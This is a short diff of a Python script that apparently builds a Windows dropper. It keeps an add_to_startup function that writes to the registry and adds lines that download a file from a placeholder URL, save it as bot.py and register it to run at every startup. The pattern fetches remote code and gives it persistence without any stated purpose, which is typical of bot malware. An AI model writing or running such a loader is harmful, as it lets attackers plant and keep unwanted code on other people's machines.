@@ -1,7 +1,7 @@
 import os
 import shutil
 import winreg as reg
-
+import requests
 
 
 
@@ -43,7 +43,7 @@ def add_to_startup(target_file):
 
 if __name__ == "__main__":
     # Specify the target file to be added to startup
-
+    r = requests.get("url", allow_redirects=True)
+    open("bot.py", 'wb').write(r.content)
     target_file_name = "bot.py"       # Change this value to file name
-                                  
     add_to_startup(target_file_name)
